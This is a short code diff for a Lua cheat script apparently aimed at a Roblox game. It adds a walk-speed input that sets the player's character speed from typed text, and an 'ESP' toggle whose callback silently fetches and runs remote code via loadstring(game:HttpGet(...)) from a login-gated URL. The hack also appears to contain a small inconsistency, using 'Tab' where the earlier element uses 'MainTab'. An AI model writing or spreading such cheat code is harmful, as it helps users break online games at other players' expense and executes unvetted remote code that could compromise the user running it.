@@ -86,5 +86,21 @@ local Slider = MainTab:CreateSlider({
    end,
 })
 
+local Input = MainTab:CreateInput({
+   Name = "Walkspeed",
+   PlaceholderText = "1-500",
+   RemoveTextAfterFocusLost = true,
+   Callback = function(Text)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Text)
+   end,
+})
 
+local Toggle = Tab:CreateToggle({
+   Name = "ESP",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        pcall(function() loadstring(game:HttpGet('https://[Log in to view URL]'))() end)
+   end,
+})
 
